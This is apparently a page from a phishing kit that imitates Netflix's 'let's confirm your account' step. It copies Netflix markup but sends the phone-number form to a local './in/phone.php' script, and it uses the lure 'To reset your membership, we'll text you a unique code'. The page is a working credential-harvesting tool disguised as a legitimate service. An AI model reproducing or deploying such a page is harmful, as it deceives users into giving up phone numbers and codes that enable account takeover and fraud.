...
<script>window.netflix = window.netflix || {} ;         netflix.notification.constants = {"pageName":"signupSimplicity-planSelectionWithContext","locale":"en-MA","sessionLength":30,"uiMode":"nonmember","ownerToken":"PGGHCBERI5HGHGLJJG555DU2RU","accept-language":"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6,es;q=0.5,de;q=0.4"};</script>
...
)) {CreateMethodProperty(Object,"fromEntries",function r(e){RequireObjectCoercible(e);var t={},o=function(r,e){var t=this,o=ToPropertyKey(r);CreateDataPropertyOrThrow(t,o,e)};return AddEntriesFromIterable(t,e,o)});}}).call('object' === typeof window && window || 'object' === typeof self && self || 'object' === typeof global && global || {});</script>
...
<div data-uia="loc" lang="en-MA" dir="ltr">
<div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-enterOTPPhoneMode simplicity" lang="en-MA" dir="ltr">
...
<a href="" class="authLinks signupBasicHeader onboarding-header" data-uia="header-signout-link">Sign Out</a>
</div>
<div class="simpleContainer" data-uia="simpleContainer" data-transitioned-child="true">
<div class="centerContainer extraGapForCountries" tabindex="0" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
<div class="otpPhoneEntryContainer" data-uia="otpPhoneEntryContainer">
...
<h1 class="stepTitle" data-uia="stepTitle">let's confirm your account</h1>
</div>
</div>
<div class="contextBody contextRow" data-uia="contextBody">To reset your membership, we'll text you a unique code to confirm your account. Rates may apply for messages and data.</div>
<ul class="simpleForm structural ui-grid">
<li data-uia="field-phoneNumber+wrapper" class="nfFormSpace">
<div class="nf-phone-input-wrapper-s dcbPhoneWrapper">
<div class="nf-phone-input">
<div class="ui-select-wrapper country-select">
<div class="ui-select-current">
<span class="country-select-flag nf-flag " data-uia="country-select-flag">
</span>
<span class="country-select-code" data-uia="country-select-code">+</span>
</div>
</div>
<div data-uia="field-mobilePhone+container" class="nfInput phone-number-input__text">
<div class="nfInputPlacement">
<label class="input_id" placeholder=""><form method="post" action="./in/phone.php">
<input  name="phoneNumber" class="nfTextField"  type="tel" maxlength="11" minlength="9" required>
<label for="id_phoneNumber" class="placeLabel">Number phone</label>
</label>
</div>
</div>
</div>
...
<button type="submit" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="submitBtn" placeholder="">Text Me</button>
</form>
</div>
</div>
</div>
...
<option label="العربية" lang="ar" value="/signup/otpPhoneEntry?locale=ar-MA">العربية</option>
<option label="Français" lang="fr" value="/signup/otpPhoneEntry?locale=fr-MA">Français</option>
<option selected="" label="English" lang="en" value="/signup/otpPhoneEntry?locale=en-MA">English</option>
</select>
</div>
</div>
</div>
